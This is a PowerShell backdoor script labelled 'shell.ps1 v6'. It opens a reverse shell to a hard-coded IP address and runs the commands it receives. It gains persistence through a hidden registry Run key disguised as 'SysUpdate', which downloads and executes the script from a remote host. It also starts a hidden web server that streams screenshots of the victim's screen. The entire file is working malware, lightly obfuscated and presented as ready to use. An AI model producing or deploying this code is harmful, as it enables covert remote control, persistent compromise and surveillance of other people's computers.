# shell.ps1 v6 - FULL PATH + BULLETPROOF WEBSERVER
$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; 
$currentPath = (Get-Location).Path; $m = ([text.encoding]::ASCII).GetBytes("CONNECTED: $currentPath`nPS $currentPath > "); 
$s.Write($m,0,$m.Length);

# Persistence
$regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.11.67/shell.ps1`")"';
New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;

# ULTRA-SIMPLE HTTP SERVER - NO ESCAPING ISSUES
$httpArgs = @('-nop', '-w', 'hidden', '-c', @'
$l=New-Object System.Net.HttpListener; $l.Prefixes.Add("http://+:8080/"); $l.Start(); $page="<h1>BACKDOOR</h1><img src=/screen><br><a href=/screen>Refresh</a>"; while($l.IsListening){$ctx=$l.GetContext(); if($ctx.Request.Url.LocalPath -eq "/screen"){Add-Type -A System.Drawing,System.Windows.Forms; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height); $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location,0,0,$b.Width,$b.Height); $ms=New-Object IO.MemoryStream; $bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg); $ctx.Response.ContentType="image/jpeg"; $ctx.Response.ContentLength64=$ms.Length; $ms.Position=0; $ms.CopyTo($ctx.Response.OutputStream); $ms.Dispose(); $bmp.Dispose(); $g.Dispose()} else {$ctx.Response.ContentType="text/html"; $bytes=[Text.Encoding]::UTF8.GetBytes($page); $ctx.Response.ContentLength64=$bytes.Length; $ctx.Response.OutputStream.Write($bytes,0,$bytes.Length)}; $ctx.Response.Close()}
'@ -join ';')
Start-Process powershell -WindowStyle Hidden -ArgumentList $httpArgs

# REVERSE SHELL
while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i); 
    $sb = try { Invoke-Expression $d 2>&1 | Out-String } catch { $_.Exception.Message }; 
    $currentPath = (Get-Location).Path;
    $out = $sb + "PS $currentPath > "; 
    $m = ([text.encoding]::ASCII).GetBytes($out); 
    $s.Write($m,0,$m.Length); 
    $s.Flush()
}
$c.Close()
